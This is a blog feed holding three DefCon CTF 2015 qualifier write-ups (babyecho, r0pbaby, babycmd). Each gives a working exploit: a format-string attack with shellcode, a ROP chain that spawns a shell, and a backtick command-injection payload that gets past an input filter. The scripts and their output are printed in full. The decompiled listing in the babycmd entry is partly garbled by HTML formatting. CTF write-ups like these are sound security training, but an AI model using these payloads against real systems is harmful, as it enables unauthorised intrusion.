<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pwn | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/pwn/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-05-18T21:46:21+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/"/>
    <updated>2015-05-18T21:45:44+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>

<pre><code>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</code></pre>

<p>First try got my attention:</p>

<pre><code>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
Reading 13 bytes
</code></pre>

<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>

<p>but there&rsquo;s a limit, 13 bytes? right?</p>

<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
some resolving symbols the function looks like this:</p>

<pre><code>int sub_8048F3C()
{
  signed int v0; // eax@2
  int v3; // [sp+10h] [bp-410h]@1
  int v4; // [sp+1Ch] [bp-404h]@4
  int v5; // [sp+41Ch] [bp-4h]@1

  v5 = *MK_FP(__GS__, 20);
  v3 = 13;
  setvbuf((int)off_80EA4C0, 0, 2, 0);
  signal(14, (int)sub_8048EB1);
  alarm(10);
  while ( 1 )
  {
    v0 = 1023;
    if ( v3 &lt;= 1023 )
      v0 = v3;
    v3 = v0;
    printf("Reading %d bytes\n", v0);
    reado((int)&amp;v4, v3, 10);
    filter_n((int)&amp;v4);
    printf((const char *)&amp;v4);
    alarm(10);
  }
}
</code></pre>

<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>

<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>

<p>i just need to know the offset, and gdb says it is 7:</p>

<pre><code>Reading 13 bytes
%p%p%p%p
[-------------------------------------registers--------------------------------------]
EAX: 0xffffc86c ("%p%p%p%p")
EBX: 0x80481a8 (push   ebx)
ECX: 0x0 
EDX: 0xffffffff 
ESI: 0x0 
EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
EIP: 0x804900f (call   0x804f560)
[----------------------------------------code----------------------------------------]
   0x8049003:   call   0x8048ecf
   0x8049008:   lea    eax,[esp+0x1c]
   0x804900c:   mov    DWORD PTR [esp],eax
=&gt; 0x804900f:   call   0x804f560
   0x8049014:   mov    DWORD PTR [esp],0xa
   0x804901b:   call   0x804fde0
   0x8049020:   mov    DWORD PTR [esp],0x14
   0x8049027:   call   0x806cb50
Guessed arguments:
arg[0]: 0xffffc86c ("%p%p%p%p")
[---------------------------------------stack----------------------------------------]
00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
01:0004|     0xffffc854 --&gt; 0xd (b'\r')
02:0008|     0xffffc858 --&gt; 0xa (b'\n')
03:0012|     0xffffc85c --&gt; 0x0 
04:0016|     0xffffc860 --&gt; 0xd (b'\r')
05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
06:0024|     0xffffc868 --&gt; 0x0 
07:0028| eax 0xffffc86c ("%p%p%p%p")
[------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value

Breakpoint 2, 0x0804900f in ?? ()
</code></pre>

<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>

<p>TL;DR
Please check my implementation:</p>

<pre><code>#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('&lt;I', v)

def u(v):
    return struct.unpack('&lt;I', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger


shellcode = (
"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
        )

readuntil(f)
f.write("%p"*5+"\n")
loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c

readuntil(f)
f.write(p(loc)+"%30u%7$n\n")



readuntil(f)
f.write(p(loc)+"%1200u%7$n\n")

readuntil(f)

wrl = loc+100 &amp; 0xffff
wrh = (loc+100 &gt;&gt; 16 ) &amp; 0xffff

print hex(wrl), hex(wrh)

payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
print payload


f.write(payload)

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>there you go:</p>

<pre><code>$ python babyecho-expl.py
0x4a24 0xffd2
�I��%018980c%0007$hn%046502c
[...]
cat /home/babyecho/flag 
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
</code></pre>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - ROPBaby Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/"/>
    <updated>2015-05-18T21:16:42+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 ROPBaby Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>As the challenge name proved we should use ROP technique to read flag from the server ( or pop a shell ).</p>

<blockquote><p>r0pbaby_542ee6516410709a1421141501f03760</p></blockquote>

<pre><code>./r0pbaby_542ee6516410709a1421141501f03760 

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007FF0352429B0
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007FF034A9DC40
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 
</code></pre>

<p>So we have address of any symbols of the <code>libc.so.6</code>.</p>

<p>Let&rsquo;s check the binary in IDA, the main function is <code>sub_C46</code>.</p>

<pre><code>__int64 sub_C46()
{
  __int64 v0; // rax@2
  signed int v1; // eax@4
  __int64 v2; // rax@12
  unsigned __int64 v3; // r14@15
  int v4; // er13@17
  size_t v5; // r12@17
  int v6; // eax@18
  void *handle; // [sp+8h] [bp-448h]@1
  char nptr[1088]; // [sp+10h] [bp-440h]@2
  __int64 savedregs; // [sp+450h] [bp+0h]@22

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sub_BF7();
          LODWORD(v0) = sub_B9A(nptr, 1024LL);
          if ( !v0 )
          {
            puts("Bad choice.");
            return 0LL;
          }
          v1 = strtol(nptr, 0LL, 10);
          if ( v1 != 2 )
            break;
          __printf_chk(1LL, "Enter symbol: ");
          LODWORD(v2) = sub_B9A(nptr, 64LL);
          if ( v2 )
          {
            dlsym(handle, nptr);
            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
          }
          else
          {
            puts("Bad symbol.");
          }
        }
        if ( v1 &gt; 2 )
          break;
        if ( v1 != 1 )
          goto LABEL_24;
        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
      }
      if ( v1 != 3 )
        break;
      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
      sub_B9A(nptr, 1024LL);
      v3 = (signed int)strtol(nptr, 0LL, 10);
      if ( v3 - 1 &gt; 0x3FF )
      {
        puts("Invalid amount.");
      }
      else
      {
        if ( v3 )
        {
          v4 = 0;
          v5 = 0LL;
          while ( 1 )
          {
            v6 = _IO_getc(stdin);
            if ( v6 == -1 )
              break;
            nptr[v5] = v6;
            ++v4;
            v5 = v4;
            if ( v3 &lt;= v4 )
              goto LABEL_22;
          }
          v5 = v4 + 1;
        }
        else
        {
          v5 = 0LL;
        }
LABEL_22:
        memcpy(&amp;savedregs, nptr, v5);
      }
    }
    if ( v1 == 4 )
      break;
LABEL_24:
    puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
</code></pre>

<p>After resolving symbols we can use third menu to overflow and execute our chain.</p>

<pre><code>$ file ./r0pbaby_542ee6516410709a1421141501f03760
./r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
$ checksec.sh --file ./r0pbaby_542ee6516410709a1421141501f03760
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./r0pbaby_542ee6516410709a1421141501f03760
</code></pre>

<p>but there may be a problem since we don&rsquo;t have the <code>libc.so.6</code>. but we have, don&rsquo;t we? :)
i used the libc&rsquo;s version of the <code>babycmd</code> challenge.</p>

<pre><code>./lib/x86_64-linux-gnu/libc.so.6 
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release version 2.19, by Roland McGrath et al.
Copyright (C) 2014 Free Software Foundation, Inc.
</code></pre>

<p>so you can find it here: [<a href="http://packages.ubuntu.com/trusty/libc6">http://packages.ubuntu.com/trusty/libc6</a>]</p>

<p>** note: just use LD_LIBRARY_PATH to use this version to implement the attack completely.</p>

<p>Then i found the offset of <code>/bin/sh</code> and <code>pop rdi; ret</code> from the <code>system</code> symbols of the our given <code>libc.so.6</code> as you can see below:<br/>
  * /bin/sh offset from system: +0x13669b<br/>
  * pop rdi; ret offset from system: -0x23b26</p>

<p>you can see my implementation here:</p>

<pre><code>#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me", 10436))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger

print s.recv(1024)
f.write("1\n")
readuntil(f, "0x")
a = f.read(16)
print a
libc = int(a, 16)

f.write("2\nsystem\n")
readuntil(f, "0x")
system = int(f.read(16), 16)
print hex(system)

f.write("3\n32\n"+"A"*8+p(system-0x23b26)+p(system+0x13669b)+p(system)+"\n")

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>and launching the attack:</p>

<pre><code>$ python r0pbaby-expl.py 
$

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 
00007F9F01F43AB0
0x7f9f0179f640
[+] shell is ready: 

1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Enter bytes to send (max 1024): 1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
ls
bin
boot
[..]
cat /home/r0pbaby/flag
The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?
</code></pre>

<p>And another 1 point. Thanks #defconctf</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babycmd Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/"/>
    <updated>2015-05-18T13:39:52+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycmd Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>As you may now defconctf started 2 days ago, so we participated and you can check our solutions right here.</p>

<p>OK, So there was 4 problem categories: <code>Baby's first</code>,  <code>Pwning</code>, <code>Coding</code>, <code>Reverse</code> and <code>Misc</code>.</p>

<p>This is babycmd writeup as you can see below,</p>

<p>&ndash;</p>

<p>There was a binary <code>babycmd_3ad28b10e8ab283d7df81795075f600b</code> by following properties:</p>

<pre><code>$ file babycmd_3ad28b10e8ab283d7df81795075f600b
babycmd_3ad28b10e8ab283d7df81795075f600b: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
$ checksec.sh --file babycmd_3ad28b10e8ab283d7df81795075f600b 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babycmd_3ad28b10e8ab283d7df81795075f600b
</code></pre>

<p>This is so much for 1 point task, but you know this is DEFCON.</p>

<!--more-->


<p>by running the binary, it was a wrapper providing 3 functionalites: <code>ping</code>, <code>host</code>, <code>dig</code></p>

<pre><code>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 received, 100 0x56191abe7100acket loss, time 2016ms          

Commands: ping, dig, host, exit                                                       
: host hamidx9.ir
hamidx9.ir has address 104.28.29.35
hamidx9.ir has address 104.28.28.35
hamidx9.ir has IPv6 address 2400:cb00:2048:1::681c:1c23
Commands: ping, dig, host, exit
: 
</code></pre>

<p>as strace says, it seems it parses the input and filter it and then try to execute!</p>

<p>Basicly with <code>executing</code> word i always look for a filter bypass and execute arbitrary commands. but <code>0x56191abe7100acket</code> in the ping command got my attention.</p>

<p>It&rsquo;s time to open the binary in IDA:</p>

<ol>
<li><p>6 main functions:<br/>
<code>sub_F5C</code>: parse and execute dig<br/>
<code>sub_10BD</code>: parse and execute host<br/>
<code>sub_E35</code>: parse and execute ping<br/>
<code>sub_121E</code>: main()<br/>
<code>sub_D65</code>: parse the input<br/>
<code>sub_DCC</code>: filter the input</p></li>
<li><p><code>ping</code> does not seem to be vulnerable:
<code>
 if ( (unsigned int)sub_D65(a1, (__int64)&amp;cp) )
 {
   if ( inet_aton(&amp;cp, &amp;v4) )
   {
     v1 = inet_ntoa(v4);
     __sprintf_chk(&amp;command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
     v2 = popen(&amp;command, "r");
     if ( v2 )
     {
       while ( fgets(&amp;s, 512, v2) )
         __printf_chk(1LL, &amp;s);
       pclose(v2);
     }
</code>
the <code>v1</code>  param which passes to <code>sprintf</code> returning from <code>inet_ntoa</code> so it cannot be a arbitrary value.</p></li>
<li><p>let&rsquo;s look at host code:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;strong&gt;int64 &lt;/strong&gt;fastcall sub_10BD(&lt;strong&gt;int64 a1)
</span><span class='line'>{
</span><span class='line'>char &lt;em&gt;v1; // rax@6
</span><span class='line'>FILE &lt;/em&gt;v2; // rbp@10
</span><span class='line'>struct in_addr v4; // [sp+0h] [bp-538h]@5
</span><span class='line'>char command; // [sp+10h] [bp-528h]@6
</span><span class='line'>char cp; // [sp+190h] [bp-3A8h]@3
</span><span class='line'>char s; // [sp+310h] [bp-228h]@12
</span><span class='line'>&lt;/strong&gt;int64 v8; // [sp+518h] [bp-20h]@1&lt;/p&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ol&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  v8 = &lt;em&gt;MK_FP(&lt;strong&gt;FS&lt;/strong&gt;, 40LL);
</span><span class='line'>  if ( a1 )
</span><span class='line'>  {
</span><span class='line'>    if ( (unsigned int)sub_D65(a1, (&lt;strong&gt;int64)&amp;cp) )
</span><span class='line'>    {
</span><span class='line'>      if ( inet_aton(&amp;cp, &amp;v4) )
</span><span class='line'>      {
</span><span class='line'>        v1 = inet_ntoa(v4);
</span><span class='line'>        &lt;/strong&gt;sprintf_chk(&amp;command, 1LL, 384LL, &ldquo;host %s&rdquo;, v1);
</span><span class='line'>      }
</span><span class='line'>      else
</span><span class='line'>      {
</span><span class='line'>        if ( !(unsigned int)sub_DCC((__int64)&amp;cp) )
</span><span class='line'>        {
</span><span class='line'>          puts(&ldquo;Invalid hostname.&rdquo;);
</span><span class='line'>          return &lt;/em&gt;MK_FP(&lt;strong&gt;FS&lt;/strong&gt;, 40LL) ^ v8;
</span><span class='line'>        }
</span><span class='line'>        &lt;strong&gt;sprintf_chk(&amp;command, 1LL, 384LL, &ldquo;host \&rdquo;%s\&ldquo;&rdquo;, &amp;cp);
</span><span class='line'>      }
</span><span class='line'>      v2 = popen(&amp;command, &ldquo;r&rdquo;);
</span><span class='line'>      if ( v2 )
</span><span class='line'>      {
</span><span class='line'>        while ( fgets(&amp;s, 512, v2) )
</span><span class='line'>          &lt;/strong&gt;printf_chk(1LL, &amp;s);
</span><span class='line'>        pclose(v2);
</span><span class='line'>      }
</span><span class='line'>      else
</span><span class='line'>      {
</span><span class='line'>        puts(&ldquo;Command failed.&rdquo;);
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>      puts(&ldquo;Invalid Host or IP address sent to dig.&rdquo;);
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>  else
</span><span class='line'>  {
</span><span class='line'>    puts(&ldquo;No address specified.&rdquo;);
</span><span class='line'>  }
</span><span class='line'>  return *MK_FP(&lt;strong&gt;FS&lt;/strong&gt;, 40LL) ^ v8;
</span><span class='line'>}
</span><span class='line'>&lt;code&gt;``
</span><span class='line'>As you can see, second&lt;/code&gt;__sprintf_chk&lt;code&gt;may acts unexpectedly. but there could be problem in using&lt;/code&gt;sub_DCC`.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ol&gt;
</span><span class='line'>&lt;li&gt;&lt;code&gt;sub_DCC&lt;/code&gt; code:</span></code></pre></td></tr></table></div></figure>
signed <strong>int64 </strong>fastcall sub_DCC(<strong>int64 a1)
{
</strong>int64 v1; // rsi@1
signed <strong>int64 v2; // rcx@1
bool v3; // zf@3
signed </strong>int64 v4; // rcx@4
signed __int64 result; // rax@4
char v6; // dl@7</li>
</ol>


<p>  v1 = a1;
  v2 = -1LL;
  do
  {
    if ( !v2 )
      break;
    v3 = <em>(_BYTE </em>)a1++ == 0;
    &ndash;v2;
  }
  while ( !v3 );
  v4 = ~v2;
  result = 0LL;
  if ( (unsigned <strong>int64)(v4 - 4) &lt;= 0x3C )
  {
    if ( (unsigned </strong>int8)((<em>(_BYTE </em>)v1 &amp; 0xDF) - 0x41) &lt;= 0x19u
      || (result = 0LL, (unsigned <strong>int8)(<em>(_BYTE </em>)v1 - 48) &lt;= 9u) )
    {
      v6 = <em>(_BYTE </em>)(v1 + v4 - 1 - 1);
      result = 1LL;
      if ( (unsigned </strong>int8)((v6 &amp; 0xDF) - 0x41) > 0x19u )
        result = (unsigned __int8)(v6 - 0x30) &lt;= 9u;
    }
  }
  return result;
}
&#8220;`</p>

<p>i just noticed that it filters some bytes but not chr(0x60) which can be used to execute command and tried some tests on input.</p>

<p>finally i could run command like this:</p>

<pre><code>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host l`ls`l
host: 'lbabycmd_3ad28b10e8ab283d7df81795075f600b
babycmd_3ad28b10e8ab283d7df81795075f600b.id0
babycmd_3ad28b10e8ab283d7df81795075f600b.id1
babycmd_3ad28b10e8ab283d7df81795075f600b.id2
babycmd_3ad28b10e8ab283d7df81795075f600b.nam
babycmd_3ad28b10e8ab283d7df81795075f600b.til
logl' is not a legal name (label too long)
Commands: ping, dig, host, exit
: 
</code></pre>

<dl>
<dt>but trying something like this <code>host l`ls /home/`l</code> can be seen below:</dt>
<dt>&#8220;`</dt>
<dt>Commands: ping, dig, host, exit</dt>
<dd>host l<code>ls /home/</code>l</dd>
<dt>sh: 1: ls/home/: not found</dt>
<dt>Host ll not found: 3(NXDOMAIN)</dt>
<dt>Commands: ping, dig, host, exit</dt>
<dd><p>&#8220;`</p></dd>
</dl>

<p>it filters space, so i can&rsquo;t run any command.
but instead of reversing the filter function, i can use <code>sh</code>, aren&rsquo;t i :)) ?</p>

<p>So here&rsquo;s my points:</p>

<ol>
<li>enter <code>host l`sh`l</code> as command</li>
<li>enter:<br/>
<code>cat /home/babycmd/flag</code></li>
<li>Press Ctrl+D</li>
<li>Press Ctrl+C</li>
</ol>


<p>So here we go:</p>

<pre><code>$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host l`sh`l
cat /home/babycmd/flag [Enter] [Ctrl+D]
: host: 'lThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??1' is not in legal name syntax (label too long)
Commands: ping, dig, host, exit
: ^C
</code></pre>

<p>So we have first 1 point at DEFCONCTF.</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
